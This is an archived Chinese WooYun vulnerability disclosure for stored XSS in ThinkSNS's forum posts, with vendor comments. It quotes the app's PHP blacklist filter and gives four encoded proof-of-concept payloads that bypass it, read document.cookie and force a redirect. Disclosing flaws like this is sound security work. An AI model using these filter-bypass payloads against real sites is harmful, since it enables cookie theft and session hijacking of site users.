{"id": 57323, "wybug_id": "wooyun-2014-054675", "wybug_title": "ThinkSNS存储型XSS一枚", "wybug_corp": "ThinkSNS", "wybug_author": "phith0n", "wybug_date": "2014-03-27 10:44", "wybug_open_date": "2014-06-22 10:44", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["持久型", "存储型", "源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-03-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-04-01：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-05-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-06-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-06-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-06-22：\t细节向公众公开  简要描述： 存储型XSS 详细说明：  thinksns在微吧的应用中，允许用户发表帖子，而帖子是富文本。所以，不可避免地涉及到富文本中xss的过滤。而问题就出来过滤的地方。thinksns使用如下函数过滤传入的参数\nfunction h($text, $type = 'html'){    // 无标签格式    $text_tags  = '';    //只保留链接    $link_tags  = '<a>';    //只保留图片    $image_tags = '<img>';    //只存在字体样式    $font_tags  = '<i><b><u><s><em><strong><font><big><small><sup><sub><bdo><h1><h2><h3><h4><h5><h6>';    //标题摘要基本格式    $base_tags  = $font_tags.'<p><br><hr><a><img><map><area><pre><code><q><blockquote><acronym><cite><ins><del><center><strike>';    //兼容Form格式    $form_tags  = $base_tags.'<form><input><textarea><button><select><optgroup><option><label><fieldset><legend>';    //内容等允许HTML的格式    $html_tags  = $base_tags.'<meta><ul><ol><li><dl><dd><dt><table><caption><td><th><tr><thead><tbody><tfoot><col><colgroup><div><span><object><embed><param>';    //专题等全HTML格式    $all_tags   = $form_tags.$html_tags.'<!DOCTYPE><html><head><title><body><base><basefont><script><noscript><applet><object><param><style><frame><frameset><noframes><iframe>';    //过滤标签    $text = real_strip_tags($text, ${$type.'_tags'});    // 过滤攻击代码    if($type != 'all') {        // 过滤危险的属性，如：过滤on事件lang js        while(preg_match('/(<[^><]+)(ondblclick|onclick|onload|onerror|unload|onmouseover|onmouseup|onmouseout|onmousedown|onkeydown|onkeypress|onkeyup|onblur|onchange|onfocus|action|background|codebase|dynsrc|lowsrc)([^><]*)/i',$text,$mat)){            $text = str_ireplace($mat[0], $mat[1].$mat[3], $text);        }        while(preg_match('/(<[^><]+)(window\\.|javascript:|js:|about:|file:|document\\.|vbs:|cookie)([^><]*)/i',$text,$mat)){            $text = str_ireplace($mat[0], $mat[1].$mat[3], $text);        }    }    return $text;}function real_strip_tags($str, $allowable_tags=\"\") {    $str = html_entity_decode($str,ENT_QUOTES,'UTF-8');    return strip_tags($str, $allowable_tags);}\n其中，传入的第一个参数是富文本内容，第二个参数默认。因为过滤不严，利用方法如下01.IE下使用style标签，expression来执行xss，POC如下：\n<img style=xss:expre\\ssion(&#97;lert(documen\\u0074.c\\u006fokie))>\n02.FF下使用embed+javascript伪协议，触发xss，POC如下：\n<embed src=java&#1&#49;5;cript:&#97;lert(documen\\u0074.c\\u006fokie)>\n以上两个POC都是直接触发的，不需要有用户交互。但受到浏览器限制。03.通用POC，点击触发：\n<a href=java&#1&#49;5;cript:&#97;lert(documen\\u0074.c\\u006fokie)>click me~</a>\n通过字符编码绕过了一些过滤。但需要点击触发，所以相对上面两个比较鸡肋。04.任意url跳转\n<meta http-equiv=\"refresh\" content=\"0;url=data:text/html,%3Cscript%3Elocation.href%3D%22http%3A%2F%2Fwww.baidu.com%22%3C%2Fscript%3E\"><meta http-equiv=\"refresh\" content=\"0;url=http://www.baidu.com\">\n   漏洞证明：  IE9下触发：\n\nFirefox下触发：\n\nchrome下点击触发：\n\n   修复方案：  使用更严格的过滤措施，避免xss的影响。   版权声明：转载请注明来源 phith0n@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-06-22 10:44 厂商回复：  最新状态： 2014-04-01：来晚了…  ", "replys": "漏洞评价：\n评论\n     2014-04-01 11:36 |    \t\tThinkSNS(乌云厂商)\t\t \n  这种字符编码方式有什么好办法规避？    \n     2014-04-01 12:04 |    \t\tphith0n  \t\t\t( 核心白帽子 |\t\t\t        Rank:656 漏洞数:107        | 一个想当文人的黑客~)\t\t \n  @ThinkSNS 这里有一个国外比较好的xss防御的库，直接调用这个库应该就能防御99%的xss漏洞了：http://htmlpurifier.org/    \n     2014-04-08 09:17 |    \t\tThinkSNS(乌云厂商)\t\t \n  @phith0n 非常感谢！    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}